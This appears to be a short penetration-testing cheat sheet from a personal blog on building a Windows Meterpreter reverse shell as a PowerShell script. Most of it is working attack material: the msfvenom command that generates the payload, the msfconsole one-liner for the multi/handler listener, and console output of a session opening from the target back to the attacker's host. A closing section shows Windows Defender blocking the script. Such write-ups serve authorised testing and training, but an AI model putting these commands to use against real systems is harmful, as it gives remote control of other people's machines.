---
title: Msfvenom Psh
date: 2021-04-01T16:14:32+05:30
lastmod: 2021-04-01T16:14:32+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
cover: /img/cover.jpg
categories:
  - chatsheet
tags:
  - metasploit
  - tools
draft: false
---

# meterpreter reverse shell with powershell

## Create Shell

```bash 
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=443 -f psh -o meterpreter-64.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3255 bytes
Saved as: meterpreter-64.ps1
```

## Setup listener

```bash
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j"
```

## Interact
```
...[snip]
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.10.10.6
lport => 443
ExitOnSession => false
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.10.6:443 
msf exploit(multi/handler) > [*] Sending stage (206403 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.10.6:443 -> 10.10.10.5:53418) 

msf exploit(multi/handler) > sessions -l

Active sessions
===============

Id Name Type Information Connection
-- ---- ---- ----------- ----------
1 meterpreter x64/windows [redacted]
```

## if Windows Defender is enabled

```powershell
PS C:\PENTEST> C:\PENTEST\meterpreter-64.ps1
At C:\PENTEST\meterpreter-64.ps1:1 char:1
+ $VlSIhDyrsor = @"
+ ~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
+ CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
+ FullyQualifiedErrorId : ScriptContainedMaliciousContent


PS C:\PENTEST>
```

 ## Summary: 
 The the generated ps1 can be saved to disk, and is not detected as a virus , and runs succesfull creating a shell, but it can’t run with defender enabled on my windows 10 box.
